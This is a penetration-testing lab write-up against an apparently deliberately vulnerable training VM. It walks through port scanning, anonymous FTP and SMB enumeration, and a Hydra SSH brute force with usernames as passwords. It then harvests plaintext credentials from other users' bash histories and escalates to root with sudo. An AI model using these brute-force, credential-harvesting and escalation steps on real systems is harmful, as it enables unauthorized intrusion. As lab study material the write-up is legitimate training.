## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.150.148
# HOSTNAME
red.initech                 // Found Post Enumeration
# OPERATING SYSTEM          // Found Post Enumeration
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial

# CREDENTIALS  
SHayslett:SHayslett         // Found Post Enumeration
peter:JZQuyIN5              // Found Post Enumeration
JKanode:thisimypassword     // Found Post Enumeration
```
## OPEN PORTS DETAILS
```bash
21/tcp    open  ftp         vsftpd 2.0.8 or later

22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

53/tcp    open  tcpwrapped

139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)

80/tcp    open  http        PHP cli server 5.5 or later
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

666/tcp   open  pkzip-file  .ZIP file

3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
```
# ENUMERATION
## PORT 21
```bash
# Checking for anonyomous login + file upload + download if any files available
sudo ftp ftp://anonymous:anonymous@$ip
Connected to 192.168.150.148.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
100% |************************************************************************************************************************************************|   107      486.00 KiB/s    00:00 ETA
226 Transfer complete.
107 bytes received in 00:00 (0.44 KiB/s)
ftp> put test.txt 
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
550 Permission denied.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> quit
221 Goodbye.

# File content - note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

# Note
- anonymous login allowed
- File upload not allowed
- Possible usernames
	- Harry
	- Elly
	- John

```
## PORT 139
```bash
# Checking shares
sudo nxc smb $ip --shares --port 139          
SMB         192.168.150.148 139    RED              [*] Unix - Samba (name:RED) (domain:) (signing:False) (SMBv1:True) 
SMB         192.168.150.148 139    RED              [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

sudo nxc smb $ip --shares -u 'anonymous' -p '' --port 139

SMB         192.168.150.148 139    RED              [*] Unix - Samba (name:RED) (domain:) (signing:False) (SMBv1:True) 
SMB         192.168.150.148 139    RED              [+] \anonymous: (Guest)
SMB         192.168.150.148 139    RED              [*] Enumerated shares
SMB         192.168.150.148 139    RED              Share           Permissions     Remark
SMB         192.168.150.148 139    RED              -----           -----------     ------
SMB         192.168.150.148 139    RED              print$                          Printer Drivers
SMB         192.168.150.148 139    RED              kathy           READ            Fred, What are we doing here?
SMB         192.168.150.148 139    RED              tmp             READ,WRITE      All temporary files should be stored here
SMB         192.168.150.148 139    RED              IPC$                            IPC Service (red server (Samba, Ubuntu))

# Share Details
Share           Permissions     Remark
-----           -----------     ------
print$                          Printer Drivers
kathy           READ            Fred, What are we doing here?
tmp             READ,WRITE      All temporary files should be stored here
IPC$                            IPC Service (red server (Samba, Ubuntu))

# Share Enumeration
- kathy share 
sudo nxc smb $ip -u 'anonymous' -p '' --port 139 --spider kathy --regex .
SMB         192.168.150.148 139    RED              [*] Unix - Samba (name:RED) (domain:) (signing:False) (SMBv1:True) 
SMB         192.168.150.148 139    RED              [+] \anonymous: (Guest)
SMB         192.168.150.148 139    RED              [*] Started spidering
SMB         192.168.150.148 139    RED              [*] Spidering .
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/. [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/.. [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/kathy_stuff [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/backup [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/kathy_stuff/. [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/kathy_stuff/.. [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/kathy_stuff/todo-list.txt [lastm:'2016-06-05 20:32' size:64]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/backup/. [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/backup/.. [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/backup/vsftpd.conf [lastm:'2016-06-05 20:33' size:5961]
SMB         192.168.150.148 139    RED              //192.168.150.148/kathy/backup/wordpress-4.tar.gz [lastm:'2015-04-27 22:44' size:6321767]
SMB         192.168.150.148 139    RED              [*] Done spidering (Completed in 4.257662534713745)

- tmp share
sudo nxc smb $ip -u 'anonymous' -p '' --port 139 --spider tmp --regex .
SMB         192.168.150.148 139    RED              [*] Unix - Samba (name:RED) (domain:) (signing:False) (SMBv1:True) 
SMB         192.168.150.148 139    RED              [+] \anonymous: (Guest)
SMB         192.168.150.148 139    RED              [*] Started spidering
SMB         192.168.150.148 139    RED              [*] Spidering .
SMB         192.168.150.148 139    RED              //192.168.150.148/tmp/. [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/tmp/.. [dir]
SMB         192.168.150.148 139    RED              //192.168.150.148/tmp/ls [lastm:'2016-06-05 21:02' size:274]
SMB         192.168.150.148 139    RED              [*] Done spidering (Completed in 1.3879859447479248)

# //192.168.150.148/kathy/kathy_stuff/todo-list.txt - file contents
I'm making sure to backup anything important for Initech, Kathy

# //192.168.150.148/tmp/ls - file contents
.:
total 12.0K
drwxrwxrwt  2 root root 4.0K Jun  5 16:32 .
drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
-rw-r--r--  1 root root    0 Jun  5 16:32 ls
drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ

# No Interesting Information
//192.168.150.148/kathy/backup/vsftpd.conf
//192.168.150.148/kathy/backup/wordpress-4.tar.gz

sudo enum4linux $ip | tee enum4linux-192.168.150.148
S-1-22-1-1000 Unix User\peter (Local User)                                                    
S-1-22-1-1001 Unix User\RNunemaker (Local User)                                               
S-1-22-1-1002 Unix User\ETollefson (Local User)                                               
S-1-22-1-1003 Unix User\DSwanger (Local User)  
S-1-22-1-1004 Unix User\AParnell (Local User)                                                 
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)   
S-1-22-1-1007 Unix User\JBare (Local User)                                                                                                                         S-1-22-1-1008 Unix User\LSolum (Local User)    
S-1-22-1-1009 Unix User\IChadwick (Local User) 
S-1-22-1-1010 Unix User\MFrei (Local User)                                                    
S-1-22-1-1011 Unix User\SStroud (Local User)                                                  
S-1-22-1-1012 Unix User\CCeaser (Local User)                                                  
S-1-22-1-1013 Unix User\JKanode (Local User)                                                                                                                       
S-1-22-1-1014 Unix User\CJoo (Local User)      
S-1-22-1-1015 Unix User\Eeth (Local User)                                                                                                                          
S-1-22-1-1016 Unix User\LSolum2 (Local User)                                                  
S-1-22-1-1017 Unix User\JLipps (Local User)                                                   
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

# Note
- Able to list shares as anonymous user
-  Share Details
	- tmp             READ,WRITE      All temporary files should be stored here
	- kathy           READ            Fred, What are we doing here?

# Found Usernames
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```
## PORT 80
```bash
# Enumeration
sudo curl -I $url
HTTP/1.1 404 Not Found
Host: 192.168.150.148
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 533

sudo whatweb $url | sed 's/,/\n/g'
http://192.168.150.148 [404 Not Found] Country[RESERVED][ZZ]
HTML5
IP[192.168.150.148]
Title[404 Not Found]

# Fuzzing 
sudo ffuf -r -c -w /usr/share/wordlists/dirb/common.txt -fc 404 -u $url/FUZZ | tee fuzz/ffuf-common 
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 231ms]
.profile                [Status: 200, Size: 675, Words: 107, Lines: 23, Duration: 233ms]
```
## PORT 12380
```bash
# Enumeration
sudo curl -I $url
HTTP/1.1 400 Bad Request
Date: Sun, 20 Jul 2025 04:11:15 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Fri, 03 Jun 2016 16:55:33 GMT
ETag: "6a16a-53462974b46e8"
Accept-Ranges: bytes
Content-Length: 434538
Dave: Soemthing doesn't look right here
Connection: close
Content-Type: text/html

sudo whatweb $url | sed 's/,/\n/g'
http://192.168.150.148:12380 [400 Bad Request] Apache[2.4.18]
Country[RESERVED][ZZ]
HTML5
HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]
IP[192.168.150.148]
Title[Tim
we need to-do better next year for Initech]
UncommonHeaders[dave]
X-UA-Compatible[IE=edge]
```
## INITIAL FOOTHOLD
```bash
sudo hydra -L ./usernames -P ./usernames ssh://$ip -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-20 11:34:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 900 login tries (l:30/p:30), ~15 tries per task
[DATA] attacking ssh://192.168.150.148:22/
[22][ssh] host: 192.168.150.148   login: SHayslett   password: SHayslett
[STATUS] 293.00 tries/min, 293 tries in 00:01h, 648 to do in 00:03h, 23 active
[STATUS] 250.33 tries/min, 751 tries in 00:03h, 196 to do in 00:01h, 17 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-20 11:38:34

sudo ssh SHayslett@$ip
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.150.148's password: 
Welcome back!


SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
SHayslett@red:~$ whoami
SHayslett
```
## PRIVILEGE ESCALATION
```bash
# found Credentials
SHayslett@red:~$ find /home -type f -name ".bash_history" 2>/dev/null | xargs cat
exit
free
exit
cat: /home/peter/.bash_history: Permission denied
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 ssh peter@localhost
ps -ef
top
kill -9 3747
exit
exit
exit
exit
whoami

# Privesc 
SHayslett@red:~$ su peter
Password: 
red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
red% sudo -i
➜  ~ id
uid=0(root) gid=0(root) groups=0(root)
➜  ~ whoami
root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Sun Jul 20 08:57:28 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 192.168.150.148
Nmap scan report for 192.168.150.148
Host is up (0.23s latency).
Not shown: 65523 filtered tcp ports (no-response), 4 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.198
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)

53/tcp    open  tcpwrapped

80/tcp    open  http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)

666/tcp   open  pkzip-file  .ZIP file
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9

3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 8
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolOld, SupportsLoadDataLocal, Support41Auth, IgnoreSigpipes, SupportsCompression, LongPassword, SupportsTransactions, FoundRows, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, InteractiveClient, ConnectWithDatabase, ODBCClient, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x11{7l\x05'>\x11Nn\x1E\x16`;6g\x1E0Mn
|_  Auth Plugin Name: mysql_native_password

12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Tim, we need to-do better next year for Initech
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)


1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.95%I=7%D=7/20%Time=687C627B%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2025-07-20T04:29:16+01:00
| smb2-time: 
|   date: 2025-07-20T03:29:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -19m58s, deviation: 34m34s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 20 08:59:45 2025 -- 1 IP address (1 host up) scanned in 136.08 seconds

```

